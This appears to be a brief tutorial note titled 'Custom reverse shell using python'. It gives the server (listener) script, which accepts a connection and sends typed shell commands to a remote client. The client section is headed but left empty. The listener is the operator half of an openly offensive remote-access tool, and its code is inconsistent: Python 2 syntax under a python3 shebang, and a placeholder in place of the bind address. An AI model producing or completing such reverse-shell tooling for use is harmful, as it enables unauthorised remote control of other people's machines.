Goal:
====
1. Custom reverse shell using python


Server Script:
==============
E.g., 
SERVER_IP = "192.168.10.20"
SERVER_PORT=8080

====== SERVER =====
#!/usr/bin/env python3

import socket


def get_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("SERVER NAME/IP", SERVER_PORT))
    s.listen(1)
    conn, addr = s.accept()
    print '[+] Connection established from: ', addr
    
    while 1:
        command = raw_input("Shell# ")
        
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print conn.recv(1024)
    

def main():
    get_connection()
    
if __name__=='__main__':
    main()
    
    
    
======= Client ======
